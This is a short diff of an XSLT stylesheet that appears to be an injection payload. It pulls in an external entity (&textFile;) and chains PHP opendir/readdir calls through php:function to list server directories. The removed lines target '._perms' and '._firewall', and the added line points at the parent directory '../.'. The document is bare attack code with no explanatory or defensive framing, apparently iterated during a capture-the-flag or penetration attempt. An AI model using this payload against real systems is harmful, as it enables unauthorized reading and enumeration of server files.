@@ -6,29 +6,8 @@
 <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
   
 <wrapper>&textFile;</wrapper>
-  <xsl:value-of select="php:function('opendir','._perms')"/>
-  <xsl:value-of select="php:function('readdir')"/> 
-  <xsl:value-of select="php:function('readdir')"/>
-  <xsl:value-of select="php:function('readdir')"/>
-  <xsl:value-of select="php:function('readdir')"/> 
-  <xsl:value-of select="php:function('readdir')"/> 
-  <xsl:value-of select="php:function('readdir')"/> 
-  <xsl:value-of select="php:function('readdir')"/> 
-  <xsl:value-of select="php:function('readdir')"/> 
-  <xsl:value-of select="php:function('readdir')"/> 
-  <xsl:value-of select="php:function('readdir')"/> 
-    <xsl:value-of select="php:function('opendir','._firewall')"/>
-  <xsl:value-of select="php:function('readdir')"/> 
-  <xsl:value-of select="php:function('readdir')"/>
-  <xsl:value-of select="php:function('readdir')"/>
-  <xsl:value-of select="php:function('readdir')"/> 
-  <xsl:value-of select="php:function('readdir')"/> 
-  <xsl:value-of select="php:function('readdir')"/> 
-  <xsl:value-of select="php:function('readdir')"/> 
-  <xsl:value-of select="php:function('readdir')"/> 
-  <xsl:value-of select="php:function('readdir')"/> 
-  <xsl:value-of select="php:function('readdir')"/> 
-    <xsl:value-of select="php:function('opendir','..')"/>
+
+    <xsl:value-of select="php:function('opendir','../.')"/>
   <xsl:value-of select="php:function('readdir')"/> 
   <xsl:value-of select="php:function('readdir')"/>
   <xsl:value-of select="php:function('readdir')"/>
